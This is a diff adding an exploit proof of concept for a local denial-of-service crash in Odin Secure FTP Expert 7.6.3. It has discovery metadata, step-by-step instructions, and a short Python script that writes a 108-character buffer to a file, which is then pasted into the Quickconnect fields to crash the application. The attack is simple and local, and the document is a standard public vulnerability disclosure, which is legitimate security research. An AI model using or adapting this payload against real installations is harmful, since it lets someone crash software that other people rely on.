@@ -1,0 +1,25 @@
+# Exploit Title: Odin Secure FTP Expert 7.6.3 - 'Site Info' Denial of Service (PoC)
+# Discovery by: Ivan Marmolejo
+# Discovery Date: 2020-03-27
+# Vendor Homepage: https://odin-secure-ftp-expert.jaleco.com/
+# Software Link Download : http://tr.oldversion.com/windows/odin-secure-ftp-expert-7-6-3
+# Version : Odin Secure FTP Expert 7.6.3
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Home Single Lenguage (ESP)
+
+Steps to Produce the Crash:
+
+   1.- Run python code: OdinSecureFTP.py
+   2.- Copy content to clipboard
+   3.- Open "OdinSecureFTPExpert.exe"
+   4.- Go to "Trial" > Connect > Quickconnect site
+   5.- Paste ClipBoard into the all fields
+   6.- Go to Connect
+   7.- Crashed
+
+Python "OdinSecureFTP" Code:
+   
+buffer = "\x41" * 108
+f = open ("OdinSecureFTP.txt", "w")
+f.write(buffer)
+f.close()
